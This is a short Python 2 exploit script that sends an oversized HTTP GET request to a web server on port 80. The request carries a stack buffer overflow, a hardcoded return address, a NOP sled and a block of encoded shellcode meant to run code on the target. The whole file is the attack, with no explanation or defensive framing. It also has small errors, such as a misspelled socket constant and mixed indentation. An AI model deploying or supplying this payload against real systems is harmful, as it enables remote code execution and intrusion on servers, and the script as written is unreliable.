#!/usr/share/python2

import socket
import sys

host = "127.0.0.1"
port = 80

crash = "A" * 1787
return_address = "\xe7\xe1\x37\x76"
nops_sled = "\x90" * 20
shellcode = (
"\xda\xdd\xb8\x72\x36\xe7\x41\xd9\x74\x24\xf4\x5d\x29\xc9"
"\xb1\x31\x83\xed\xfc\x31\x45\x14\x03\x45\x66\xd4\x12\xbd"
"\x6e\x9a\xdd\x3e\x6e\xfb\x54\xdb\x5f\x3b\x02\xaf\xcf\x8b"
"\x40\xfd\xe3\x60\x04\x16\x70\x04\x81\x19\x31\xa3\xf7\x14"
"\xc2\x98\xc4\x37\x40\xe3\x18\x98\x79\x2c\x6d\xd9\xbe\x51"
"\x9c\x8b\x17\x1d\x33\x3c\x1c\x6b\x88\xb7\x6e\x7d\x88\x24"
"\x26\x7c\xb9\xfa\x3d\x27\x19\xfc\x92\x53\x10\xe6\xf7\x5e"
"\xea\x9d\xc3\x15\xed\x77\x1a\xd5\x42\xb6\x93\x24\x9a\xfe"
"\x13\xd7\xe9\xf6\x60\x6a\xea\xcc\x1b\xb0\x7f\xd7\xbb\x33"
"\x27\x33\x3a\x97\xbe\xb0\x30\x5c\xb4\x9f\x54\x63\x19\x94"
"\x60\xe8\x9c\x7b\xe1\xaa\xba\x5f\xaa\x69\xa2\xc6\x16\xdf"
"\xdb\x19\xf9\x80\x79\x51\x17\xd4\xf3\x38\x7d\x2b\x81\x46"
"\x33\x2b\x99\x48\x63\x44\xa8\xc3\xec\x13\x35\x06\x49\xeb"
"\x7f\x0b\xfb\x64\x26\xd9\xbe\xe8\xd9\x37\xfc\x14\x5a\xb2"
"\x7c\xe3\x42\xb7\x79\xaf\xc4\x2b\xf3\xa0\xa0\x4b\xa0\xc1"
"\xe0\x2f\x27\x52\x68\x9e\xc2\xd2\x0b\xde"
)
padding = "B" * 2000

payload = crash + return_address + nops_sled + shellcode +  padding

buffer = "GET "
buffer += payload
buffer += " HTTP/1.1\r\n\r\n"

try:
	s = socket.socket(socket_AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	s.send(bytes(buffer))
  print("Exploited Sucessfully")
	s.close()
except:
	print("Host is Umreachable")
	sys.exit()
